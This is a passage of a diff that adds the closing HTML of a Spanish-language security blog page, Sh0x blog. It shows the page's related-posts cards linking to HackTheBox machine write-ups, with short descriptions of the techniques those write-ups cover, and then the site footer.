+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#perl">perl</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#shellshock">shellshock</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#sudo">sudo</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/schooled">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/schooled">HackTheBox - Schooled</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/knife">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" alt="HackTheBox - Knife"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/knife">HackTheBox - Knife</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo).
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">28 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
